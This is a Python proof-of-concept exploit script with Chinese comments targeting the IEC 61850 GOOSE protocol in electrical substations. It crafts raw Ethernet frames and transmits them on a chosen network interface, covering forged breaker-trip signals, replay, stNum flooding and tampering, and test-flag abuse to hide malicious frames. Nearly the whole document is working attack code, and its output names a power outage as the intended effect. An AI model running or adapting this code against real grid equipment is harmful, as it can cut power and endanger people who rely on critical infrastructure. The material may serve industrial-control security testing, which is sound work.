"""
POC - GOOSE (IEC 61850-8-1)
============================
IEC 61850 变电站通用面向对象事件协议漏洞利用验证。

漏洞:
1. spoof        — GOOSE 报文伪造 (虚假跳闸/合闸信号)
2. replay       — 重放攻击 (重放合法 GOOSE 报文)
3. flood        — StNum 泛洪 (大量状态变更事件)
4. stnum_tamper — stNum 篡改 (异常 stNum 扰乱 IED 状态机)
5. test_flag    — Test 标志滥用 (设置 test=True 绕过检测)
6. all          — 所有漏洞

用法:
  python poc.py --vuln spoof
  python poc.py --vuln flood --count 500
  python poc.py --vuln all
  python poc.py --interface eth0 --vuln spoof    # 实际发送
"""

import argparse
import struct
import time
import socket
import sys
from typing import Optional

POC_VERSION = '2.0.0'
ETHERTYPE_GOOSE = 0x88B8


def _bl(l: int) -> bytes:
    if l < 128:
        return bytes([l])
    return struct.pack('!BH', 0x81, l)


def _bi(tag: int, v: int) -> bytes:
    v = v & 0xFFFFFFFF  # 处理负值
    if v < 256:
        d = bytes([v])
    elif v < 65536:
        d = struct.pack('!H', v)
    else:
        d = struct.pack('!I', v)
    return bytes([tag]) + _bl(len(d)) + d


def _bs(tag: int, s: str) -> bytes:
    d = s.encode('utf-8')
    return bytes([tag]) + _bl(len(d)) + d


def _hex_dump(data: bytes, width: int = 16) -> str:
    result = []
    for i in range(0, len(data), width):
        chunk = data[i:i + width]
        hex_part = ' '.join(f'{b:02x}' for b in chunk)
        ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
        result.append(f'  {i:04x}  {hex_part:<{width*3}}  {ascii_part}')
    return '\n'.join(result)


def make_goose(st_num: int = 1, sq_num: int = 1, test: bool = False,
               trip: bool = False, voltage: float = 110.0, current: float = 500.0,
               src_mac: bytes = bytes([0x00, 0x50, 0xc2, 0xff, 0xff, 0x01]),
               dst_mac: bytes = bytes([0x01, 0x0c, 0xcd, 0x01, 0x00, 0x01])) -> bytes:
    """
    构造 GOOSE 报文 (完整以太网帧)

    包含:
    - VLAN 标签 (优先级 4)
    - GOOSE PDU 完整字段
    - allData 含 trip 状态 + 电压/电流值
    """
    now = time.time()
    t_enc = struct.pack('!II', int(now), int((now - int(now)) * 1e9))

    pdu = b''
    pdu += _bs(0xA0, 'POC_CB1/LLN0$GO$poc1')       # gocbRef
    pdu += _bi(0xA1, 4000)                            # timeAllowedtoLive
    pdu += _bs(0xA2, 'POC_CB1/LLN0$DataSet$ds1')    # datSet
    pdu += _bs(0xA3, 'GOOSE_POC')                    # goID
    pdu += bytes([0xA4]) + _bl(len(t_enc)) + t_enc   # t (时间戳)
    pdu += _bi(0x85, st_num)                          # stNum
    pdu += _bi(0x86, sq_num)                          # sqNum
    pdu += bytes([0x87, 1, 1 if test else 0])         # test
    pdu += _bi(0x88, 1)                               # confRev
    pdu += bytes([0x89, 1, 0])                        # ndsCom
    pdu += _bi(0x8A, 3)                               # numDatSetEntries

    # allData: [trip(bool), voltage(float), current(float)]
    ds = bytes([0x02, 1, 1 if trip else 0])           # boolean: trip
    ds += bytes([0x02, 4]) + struct.pack('!f', voltage)  # float: voltage
    ds += bytes([0x02, 4]) + struct.pack('!f', current)  # float: current
    pdu += bytes([0xAB]) + _bl(len(ds)) + ds          # allData

    goose_pdu = bytes([0x81]) + _bl(len(pdu)) + pdu

    # 以太网帧
    eth = dst_mac + src_mac
    eth += struct.pack('!HH', 0x8100, 0x8000)          # VLAN (优先级 4)
    eth += struct.pack('!HH', ETHERTYPE_GOOSE, 0x1000) # APPID=0x1000
    eth += struct.pack('!HH', 8 + len(goose_pdu), 0)   # length + reserved
    eth += goose_pdu
    if len(eth) < 64:
        eth += b'\x00' * (64 - len(eth))
    return eth


class GOOSEPOC:
    """GOOSE 漏洞 POC"""

    def __init__(self, interface: Optional[str] = None):
        self.interface = interface

    def _send_raw(self, packet: bytes) -> bool:
        """通过 raw socket 发送 GOOSE 帧"""
        if not self.interface:
            return False
        try:
            # Linux: AF_PACKET raw socket
            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETHERTYPE_GOOSE))
            s.bind((self.interface, 0))
            s.send(packet)
            s.close()
            print(f'  [→] 已通过 {self.interface} 发送 ({len(packet)}B)')
            return True
        except AttributeError:
            # Windows: 需要 Npcap/WinPcap, AF_PACKET 不可用
            print(f'  [-] Windows raw socket 需要 Npcap')
            return False
        except Exception as e:
            print(f'  [-] 发送失败: {e}')
            return False

    def spoof(self) -> bool:
        """POC: GOOSE 报文伪造"""
        print(f'\n[*] POC: GOOSE 报文伪造')

        # 正常合闸报文
        normal = make_goose(st_num=100, sq_num=0, trip=False)
        # 伪造跳闸报文
        fake_trip = make_goose(st_num=200, sq_num=0, trip=True)

        print(f'  正常合闸: stNum=100, sqNum=0, trip=False ({len(normal)}B)')
        print(f'  伪造跳闸: stNum=200, sqNum=0, trip=True ({len(fake_trip)}B)')
        print(f'  dst MAC: 01:0c:cd:01:00:01 (GOOSE 标准多播)')
        print(f'  allData: [trip=True, voltage=110.0kV, current=500.0A]')

        if self.interface:
            self._send_raw(fake_trip)
            print(f'  [!] 伪造跳闸报文已发送至网络')

        print(f'  [!] 攻击后果: 断路器误跳导致停电事故')

        return True

    def replay(self) -> bool:
        """POC: GOOSE 重放攻击"""
        print(f'\n[*] POC: GOOSE 重放攻击')

        # 捕获状态
        captured = make_goose(st_num=5, sq_num=10, trip=False)
        print(f'  捕获报文: stNum=5, sqNum=10, trip=False ({len(captured)}B)')
        print(f'  时间戳: 捕获时系统时间')

        if self.interface:
            self._send_raw(captured)
            print(f'  原始报文已发送')

        time.sleep(1)
        print(f'  等待 1s...')
        print(f'  重放相同报文 (含原始时间戳)...')

        if self.interface:
            self._send_raw(captured)
            print(f'  重放报文已发送')

        print(f'  [!] GOOSE 缺乏时间戳校验和重放保护机制')
        print(f'  [!] IED 无法区分原始报文和重放报文')

        return True

    def flood(self, n: int = 200) -> bool:
        """POC: StNum 泛洪"""
        print(f'\n[*] POC: GOOSE StNum 泛洪 ({n} 个状态变更)')

        start = time.time()
        for i in range(n):
            make_goose(st_num=i + 1, sq_num=0, trip=(i % 5 == 0))
        elapsed = time.time() - start

        print(f'  生成 {n} 个 GOOSE 事件, {elapsed:.1f}s ({n/elapsed:.0f} pps)')
        print(f'  每个事件 stNum 递增: 1 → {n}')
        print(f'  每 5 个事件包含一个跳闸信号')

        if self.interface:
            print(f'  网络发送: {min(n, 50)} 个报文')
            for i in range(min(n, 50)):
                pkt = make_goose(st_num=i + 1, sq_num=0, trip=(i % 5 == 0))
                self._send_raw(pkt)

        print(f'  [!] IED 需逐个处理 stNum 递增, CPU 可能过载')
        print(f'  [!] 风险: IED 处理延迟导致保护响应变慢')

        return True

    def stnum_tamper(self) -> bool:
        """POC: stNum 篡改"""
        print(f'\n[*] POC: GOOSE stNum 篡改')

        scenarios = [
            (0, 'stNum=0: 不符合规范, 某些 IED 会丢弃'),
            (0xFFFFFFFF, 'stNum=最大溢出值: 可能造成溢出比较错误'),
            (0x80000000, 'stNum=负数: 符号位处理问题'),
            (-1, 'stNum=-1: IED 可能将其转为无符号 0xFFFFFFFF'),
        ]

        for st_num, desc in scenarios:
            pkt = make_goose(st_num=st_num, sq_num=0, trip=False)
            print(f'  stNum={st_num} → {desc} ({len(pkt)}B)')

        if self.interface:
            pkt = make_goose(st_num=0xFFFFFFFF, sq_num=0, trip=True)
            self._send_raw(pkt)
            print(f'  stNum=0xFFFFFFFF 报文已发送')

        print(f'  [!] 异常 stNum 可导致 IED stNum 比较逻辑混乱')
        print(f'  [!] 风险: 新旧报文无法正确排序')

        return True

    def test_flag(self) -> bool:
        """POC: Test 标志滥用"""
        print(f'\n[*] POC: GOOSE Test 标志滥用')

        # 正常报文
        normal = make_goose(st_num=10, sq_num=0, test=False, trip=True)
        test_flag_pkt = make_goose(st_num=10, sq_num=0, test=True, trip=True)

        print(f'  正常跳闸: test=False ({len(normal)}B)')
        print(f'  Test 报文: test=True, trip=True ({len(test_flag_pkt)}B)')
        print(f'\n  相同 stNum/sgNum 但 test 标志不同:')
        print(f'  正常帧: 触发保护动作')
        print(f'  Test帧: 部分 IED 忽略 test=True 的跳闸信号')

        if self.interface:
            self._send_raw(test_flag_pkt)
            print(f'  Test 报文已发送')

        print(f'  [!] 攻击者可以用 Test=True 隐藏恶意报文')
        print(f'  [!] 风险: 在检修维护时发送伪造 Test 报文')

        return True

    def run_all(self):
        """运行所有 POC"""
        print(f'GOOSE POC v{POC_VERSION} — 全扫描模式\n')
        results = []
        for name, fn in [
            ('报文伪造', self.spoof),
            ('重放攻击', self.replay),
            ('stNum 篡改', self.stnum_tamper),
            ('Test 标志滥用', self.test_flag),
            ('StNum 泛洪', lambda: self.flood(100)),
        ]:
            print(f'\n{"=" * 50}')
            print(f'  [{name}]')
            print(f'{"=" * 50}')
            r = fn()
            results.append((name, r))

        print(f'\n\n{"=" * 50}')
        print(f'  POC 扫描报告')
        print(f'{"=" * 50}')
        for name, success in results:
            print(f'  [{"+" if success else "-"}] {name}')
        print(f'  [结果] {sum(1 for _, s in results if s)}/{len(results)} 通过')


def main():
    parser = argparse.ArgumentParser(
        description=f'GOOSE POC v{POC_VERSION} — IEC 61850-8-1 变电站事件漏洞利用验证')
    parser.add_argument('--vuln', required=True,
                        choices=['spoof', 'replay', 'flood', 'stnum_tamper',
                                 'test_flag', 'all'],
                        help='漏洞类型')
    parser.add_argument('--count', type=int, default=200,
                        help='泛洪报文数 (默认 200)')
    parser.add_argument('--interface',
                        help='网络接口 (Linux: eth0; Windows 需要 Npcap)')

    args = parser.parse_args()
    poc = GOOSEPOC(args.interface)

    print(f'GOOSE POC v{POC_VERSION}')
    if args.interface:
        print(f'  网络接口: {args.interface}')
    else:
        print(f'  本地模式 (仅构造不发送, 使用 --interface 指定网卡)')

    vuln_map = {
        'spoof': ('报文伪造', poc.spoof),
        'replay': ('重放攻击', poc.replay),
        'flood': ('StNum 泛洪', lambda: poc.flood(args.count)),
        'stnum_tamper': ('stNum 篡改', poc.stnum_tamper),
        'test_flag': ('Test 标志滥用', poc.test_flag),
    }

    if args.vuln == 'all':
        poc.run_all()
    else:
        name, fn = vuln_map[args.vuln]
        fn()


if __name__ == '__main__':
    main()
